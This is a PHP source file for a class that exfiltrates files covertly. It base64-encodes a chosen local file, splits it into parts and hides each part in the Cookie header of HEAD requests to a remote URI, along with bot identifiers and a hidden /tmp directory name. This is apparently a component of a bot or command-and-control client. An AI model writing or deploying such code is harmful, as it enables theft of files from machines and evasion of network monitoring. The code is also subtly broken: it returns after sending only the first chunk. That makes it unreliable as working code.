<?php

namespace curlStuff\defaultClient;

use AllowDynamicProperties;
use GuzzleHttp\Client;

#[AllowDynamicProperties] class genericChunkFileTransfer extends Client
{
    public function __construct(array $config = [])
    {
        define("outDir", sprintf("/tmp/.%s", bin2hex(openssl_random_pseudo_bytes(10))));
        $this->randomDir = outDir;
        parent::__construct($config);
    }

    /**
     * @throws Exception
     */
    public function chunkTransferFile(string $uri, array $options = [], array $botSpecific = [], string $fileName)
    {
        if (!file_exists($fileName)) {
            throw new Exception("File does not exist");
        }
        $content = file_get_contents($fileName);
        $encode = base64_encode($content);
        $partLength = ceil(strlen($encode) / 8);
        $parts = str_split($encode, $partLength);
        $counter = 0;
        foreach ($parts as $p){
            $counter += 1;
            $options['headers']['Cookie'] = sprintf("cft=1; %s=%s; uuid=%s; token=%s; t=%s; c=%s.%s",
                $botSpecific['cname'],
                $botSpecific['cval'],
                $botSpecific['uuid'],
                $p,
                $this->randomDir,
                $counter,
                "8"
            );
            $chunky = parent::head($uri, $options);
            if (hash_equals(base64_decode($chunky->getHeaderLine("MD5")), md5($p))){
                return "File upload success!";
            }else{
                return "File upload failure :(";
            }
        }
    }

}